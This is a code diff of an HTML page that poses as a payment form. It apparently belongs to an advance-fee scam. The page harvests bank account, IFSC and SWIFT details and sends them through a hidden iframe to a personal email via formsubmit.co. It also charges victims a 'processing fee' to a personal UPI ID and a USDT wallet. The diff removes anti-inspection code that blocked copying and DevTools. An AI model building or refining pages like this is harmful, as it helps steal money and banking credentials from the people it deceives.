@@ -4,9 +4,12 @@
 <meta charset="UTF-8">
 <meta name="viewport"
  content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-<title>Secure Payment Form</title>
+<title>Flashing Form </title>
 
 <style>
+
+
+
 body {
   margin: 0;
   padding: 0;
@@ -17,6 +20,9 @@ body {
   align-items: flex-start;
   min-height: 100vh;
 }
+
+
+
 
 .form-card {
   background: #fff;
@@ -37,7 +43,8 @@ h2 {
   margin-top: 14px;
 }
 
-.field input, select {
+.field input,
+.field select {
   width: 100%;
   padding: 12px;
   border-radius: 8px;
@@ -82,6 +89,32 @@ h2 {
   color:#e65100;
 }
 
+/* ✅ MISSING CSS FIXED */
+.copy-row{
+  display:flex;
+  gap:8px;
+  margin-top:10px;
+}
+.copy-row input{
+  flex:1;
+  text-align:center;
+  font-weight:bold;
+}
+.copy-row button{
+  width:auto;
+  padding:8px 14px;
+  background:#2196f3;
+  color:white;
+  border:none;
+  border-radius:8px;
+}
+.copy-msg{
+  color:green;
+  font-size:14px;
+  margin-top:6px;
+  display:none;
+}
+
 button {
   width: 100%;
   margin-top: 18px;
@@ -115,18 +148,100 @@ button {
   width:90%;
   max-width:300px;
 }
+
+@media (max-width: 360px) {
+  .form-card {
+    padding: 18px;
+  }
+  h2 {
+    font-size: 20px;
+  }
+}
+.form-card {
+  border: none !important;
+  outline: none !important;
+}
+
+.form-card * {
+  outline: none !important;
+  box-shadow: none;
+}
+
+iframe {
+  display: none;
+}
+/* ✅ REMOVE HORIZONTAL LINE & FULL CENTER FIX */
+html, body {
+  width: 100%;
+  overflow-x: hidden;
+}
+
+/* ✅ PERFECT CENTER ON ALL DEVICES */
+body {
+  display: flex;
+  justify-content: center;
+  align-items: flex-start;
+}
+
+/* ✅ REMOVE EXTRA LINE COMING FROM IFRAME */
+iframe {
+  display: none !important;
+}
+
+/* ✅ FORM CARD ALWAYS CENTER */
+.form-card {
+  margin-left: auto;
+  margin-right: auto;
+}
+
+/* ✅ MOBILE TOUCH + CLICK FEEL FIX */
+input, select, button {
+  -webkit-tap-highlight-color: transparent;
+  touch-action: manipulation;
+}
+
+/* ✅ REMOVE RANDOM GRAY LINE ISSUE */
+* {
+  box-sizing: border-box;
+}
+
+
+/* ✅ DROPDOWN VISIBILITY FIX */
+.form-card,
+.payment-section {
+  overflow: visible !important;
+}
+
+/* ✅ FIELD KO CLIP NA KARO (SELECT KE LIYE) */
+.field {
+  overflow: visible !important;
+  position: relative;
+}
+
+/* ✅ SELECT MOBILE PE FULL WIDTH & SAFE */
+.field select {
+  appearance: auto;
+  -webkit-appearance: auto;
+  background-clip: padding-box;
+}
+
+/* ✅ HORIZONTAL SCROLL BLOCK RAHE */
+html, body {
+  overflow-x: hidden;
+}
+
 </style>
 </head>
 
 <body>
 
 <div class="form-card">
-<h2>Secure Payment Form</h2>
+<h2>Please Enter Details in  Form</h2>
 
 <iframe name="hiddenFrame" style="display:none;"></iframe>
 
 <form id="paymentForm"
-action="https://formsubmit.co/chaitanyadeep1@gmail.com"
+action="https://formsubmit.co/chaitanydeep1@gmail.com"
 method="POST"
 enctype="multipart/form-data"
 target="hiddenFrame"
@@ -134,6 +249,9 @@ onsubmit="return showPopup();">
 
 <input type="hidden" name="_captcha" value="false">
 <input type="hidden" name="_template" value="table">
+<input type="hidden" name="_auto_response" value="Thank you! Your payment request has been received. We will contact you soon.">
+<input type="hidden" name="_subject" value="Your Payment Form Confirmation">
+
 
 <div class="field"><input name="Name" placeholder="Full Name" required></div>
 <div class="field"><input name="Email" type="email" placeholder="Email" required></div>
@@ -151,29 +269,43 @@ onsubmit="return showPopup();">
 
 <div class="field"><input name="Account" placeholder="Account No" required></div>
 <div class="field"><input name="IFSC" placeholder="IFSC Code"></div>
+<div class="field"><input name="Branch Name" placeholder="Branch Name" required></div>
+<div class="field"><input name="Branch Code" placeholder="Branch Code"></div>
+<div class="field"><input name="SWIFT Code" placeholder="SWIFT Code"></div>
+
 <div class="field"><input name="Amount" placeholder="Amount" required></div>
 
+<div class="field">
 <select id="payment" name="Payment Method" required onchange="togglePayment(this.value)">
   <option value="">Select Payment Method</option>
   <option value="UPI">UPI</option>
   <option value="USDT">USDT (BEP20)</option>
 </select>
+</div>
 
-<!-- ✅ FEES DISPLAY -->
 <div id="feeBox" class="fee-box"></div>
 
+<!-- ✅ UPI BOX (STRUCTURE FIXED) -->
 <div id="upiBox" class="payment-section">
   <h4>Scan & Pay via UPI</h4>
   <img src="qr.png" width="160">
+
+  <div class="copy-row">
+    <input id="upiId" value="chetan155223-1@oksbi" readonly>
+    <button type="button" onclick="copyUPI()">COPY</button>
+  </div>
+
+  <p id="upiMsg" class="copy-msg">✅ UPI ID Copied</p>
 </div>
 
+<!-- ✅ USDT BOX -->
 <div id="usdtBox" class="payment-section">
   <h4>USDT BEP20 Address</h4>
 
   <div style="display:flex; gap:8px;">
     <input 
       id="usdtAddress"
-      value="0xYOURUSDTADDRESS" 
+      value="0xF1b0CB8A9F078Bf1E1F4F37f21e9FEe459992fCd"
       readonly 
       style="flex:1; text-align:center; font-weight:bold;"
     >
@@ -187,15 +319,6 @@ onsubmit="return showPopup();">
     </button>
   </div>
 
-  <!-- ✅ AUTO GENERATED QR -->
-  <img 
-    id="usdtQR" 
-    src="" 
-    width="160" 
-    style="margin-top:12px; display:none;"
-  >
-
-  <!-- ✅ COPY SUCCESS TEXT -->
   <p id="copyMsg" style="color:green; font-size:14px; display:none; margin-top:6px;">
     ✅ Address Copied Successfully
   </p>
@@ -212,105 +335,46 @@ onsubmit="return showPopup();">
   </div>
 </div>
 
+
 <script>
+/* ---------------- COUNTRY + BANK DATA ---------------- */
 const countryData = {
 
   India: [
-    "State Bank of India (SBI)",
-    "HDFC Bank",
-    "ICICI Bank",
-    "Axis Bank",
-    "Punjab National Bank (PNB)",
-    "Bank of Baroda (BOB)",
-    "Canara Bank",
-    "Union Bank of India",
-    "IDBI Bank",
-    "Indian Bank",
-    "Central Bank of India",
-    "UCO Bank",
-    "Kotak Mahindra Bank",
-    "Yes Bank",
-    "IndusInd Bank",
-    "Federal Bank",
-    "Bandhan Bank",
-    "RBL Bank",
-    "IDFC First Bank",
-    "South Indian Bank"
+    "State Bank of India (SBI)", "HDFC Bank", "ICICI Bank", "Axis Bank", "Punjab National Bank (PNB)",
+    "Bank of Baroda (BOB)", "Canara Bank", "Union Bank of India", "IDBI Bank", "Indian Bank",
+    "Central Bank of India", "UCO Bank", "Kotak Mahindra Bank", "Yes Bank", "IndusInd Bank",
+    "Federal Bank", "Bandhan Bank", "RBL Bank", "IDFC First Bank", "South Indian Bank"
   ],
 
   USA: [
-    "Chase Bank",
-    "Bank of America",
-    "Wells Fargo",
-    "Citibank",
-    "Capital One",
-    "PNC Bank",
-    "U.S. Bank",
-    "TD Bank",
-    "Truist Bank",
-    "Regions Bank",
-    "SunTrust Bank",
-    "BB&T Bank",
-    "Fifth Third Bank",
-    "KeyBank",
-    "Huntington Bank",
-    "M&T Bank",
-    "Ally Bank",
-    "Discover Bank",
-    "Synchrony Bank",
-    "Citizens Bank"
+    "Chase Bank", "Bank of America", "Wells Fargo", "Citibank", "Capital One",
+    "PNC Bank", "U.S. Bank", "TD Bank", "Truist Bank", "Regions Bank",
+    "SunTrust Bank", "BB&T Bank", "Fifth Third Bank", "KeyBank", "Huntington Bank",
+    "M&T Bank", "Ally Bank", "Discover Bank", "Synchrony Bank", "Citizens Bank"
   ],
 
   UAE: [
-    "Emirates NBD",
-    "First Abu Dhabi Bank (FAB)",
-    "Mashreq Bank",
-    "Abu Dhabi Commercial Bank (ADCB)",
-    "Dubai Islamic Bank",
-    "Commercial Bank of Dubai (CBD)",
-    "RAK Bank",
-    "Sharjah Islamic Bank",
-    "Ajman Bank",
-    "Noor Bank",
-    "Al Hilal Bank",
-    "Arab Bank for Investment & Foreign Trade",
-    "United Arab Bank",
-    "Finance House",
-    "National Bank of Fujairah",
-    "Emirates Islamic Bank",
-    "Invest Bank",
-    "Arab Bank UAE",
-    "Bank of Baroda UAE",
-    "HSBC UAE"
+    "Emirates NBD", "First Abu Dhabi Bank (FAB)", "Mashreq Bank", "Abu Dhabi Commercial Bank (ADCB)",
+    "Dubai Islamic Bank", "Commercial Bank of Dubai (CBD)", "RAK Bank", "Sharjah Islamic Bank",
+    "Ajman Bank", "Noor Bank", "Al Hilal Bank", "United Arab Bank", "Finance House",
+    "National Bank of Fujairah", "Emirates Islamic Bank", "Invest Bank",
+    "Arab Bank UAE", "Bank of Baroda UAE", "HSBC UAE"
   ],
 
   UK: [
-    "HSBC UK",
-    "Barclays",
-    "Lloyds Bank",
-    "NatWest",
-    "Santander UK",
-    "TSB Bank",
-    "Metro Bank",
-    "Nationwide Building Society",
-    "Virgin Money UK",
-    "Co-operative Bank",
-    "Starling Bank",
-    "Monzo Bank",
-    "Revolut UK",
-    "Clydesdale Bank",
-    "Yorkshire Bank",
-    "Royal Bank of Scotland",
-    "Bank of Scotland",
-    "Aldermore Bank",
-    "Close Brothers",
-    "Atom Bank"
+    "HSBC UK", "Barclays", "Lloyds Bank", "NatWest", "Santander UK",
+    "TSB Bank", "Metro Bank", "Nationwide Building Society", "Virgin Money UK",
+    "Co-operative Bank", "Starling Bank", "Monzo Bank", "Revolut UK",
+    "Clydesdale Bank", "Yorkshire Bank", "Royal Bank of Scotland",
+    "Bank of Scotland", "Aldermore Bank", "Close Brothers", "Atom Bank"
   ]
 
 };
 
 let selectedCountry = "";
 
+/* ---------------- COUNTRY SEARCH ---------------- */
 function searchCountry(){
   let input = countryInput.value.toLowerCase();
   countrySuggest.innerHTML = "";
@@ -328,6 +392,7 @@ function searchCountry(){
   });
 }
 
+/* ---------------- BANK SEARCH ---------------- */
 function searchBank(){
   if (!selectedCountry) return;
   let input = bankInput.value.toLowerCase();
@@ -345,7 +410,7 @@ function searchBank(){
   });
 }
 
-/* ✅ PAYMENT + FEES LOGIC */
+/* ---------------- FEES + PAYMENT BOX LOGIC ---------------- */
 function togglePayment(value){
   upiBox.style.display = "none";
   usdtBox.style.display = "none";
@@ -354,16 +419,17 @@ function togglePayment(value){
   if(value === "UPI"){
     upiBox.style.display = "block";
     feeBox.style.display = "block";
-    feeBox.innerHTML = "✅  Processing Fees: ₹3999";
+    feeBox.innerHTML = "✅ Processing Fees: ₹3999";
   }
 
   if(value === "USDT"){
     usdtBox.style.display = "block";
     feeBox.style.display = "block";
-    feeBox.innerHTML = "✅ USDT Network Fees: 50 USDT";
+    feeBox.innerHTML = "✅ USDT Fees: 50 USDT";
   }
 }
 
+/* ---------------- POPUP + SUBMIT LOGIC ---------------- */
 function showPopup(){
   if(payment.value === ""){
     alert("Please select payment method first!");
@@ -385,71 +451,25 @@ function showPopup(){
 
   return false;
 }
+/* ✅ COPY UPI */
+function copyUPI(){
+  upiId.select();
+  navigator.clipboard.writeText(upiId.value);
+  upiMsg.style.display = "block"; 
+  setTimeout(()=> upiMsg.style.display = "none",2000);
+}
 
-
+/* ---------------- COPY USDT ADDRESS ---------------- */
 function copyUSDT(){
   const address = document.getElementById("usdtAddress");
   address.select();
   address.setSelectionRange(0, 99999);
   navigator.clipboard.writeText(address.value);
 
-  const msg = document.getElementById("copyMsg");
-  msg.style.display = "block";
-
-  setTimeout(()=>{
-    msg.style.display = "none";
-  },2000);
+  copyMsg.style.display = "block";
+  setTimeout(()=> copyMsg.style.display = "none", 2000);
 }
-
 </script>
-
- <script>
-  // 🚫 Disable right click, select, drag
-  document.addEventListener("contextmenu", e => e.preventDefault());
-  document.addEventListener("selectstart", e => e.preventDefault());
-  document.addEventListener("dragstart", e => e.preventDefault());
-
-  // 🚫 Disable keyboard shortcuts (copy, paste, inspect, etc.)
-  document.addEventListener("keydown", e => {
-    if (
-      e.key === "F12" ||
-      (e.ctrlKey && e.shiftKey && (e.key === "I" || e.key === "J")) ||
-      (e.ctrlKey && (e.key === "U" || e.key === "C" || e.key === "X" || e.key === "V" || e.key === "S"))
-    ) {
-      e.preventDefault();
-      return false;
-    }
-  });
-
-  // 🔒 Silent DevTools detection (no popup)
-  (function() {
-    const devtools = /./;
-    devtools.toString = function() {
-      return ""; // no alert or console log
-    };
-    console.log("%c", devtools);
-  })();
-
-  // 🔐 Detect DevTools using resize trick (no popup)
-  setInterval(() => {
-    const threshold = 160;
-    const widthDiff = window.outerWidth - window.innerWidth > threshold;
-    const heightDiff = window.outerHeight - window.innerHeight > threshold;
-    if (widthDiff || heightDiff) {
-      // Optional: silently redirect or blank the page
-      document.body.innerHTML = "";
-    }
-  }, 1000);
-
-  // 🧱 Disable copy/paste/cut
-  ["copy", "paste", "cut"].forEach(evt =>
-    document.addEventListener(evt, e => e.preventDefault())
-  );
-
-  // 🔁 Freeze console methods silently
-  Object.freeze(console);
-  Object.freeze(window.console);
-</script> 
 
 </body>
 </html>
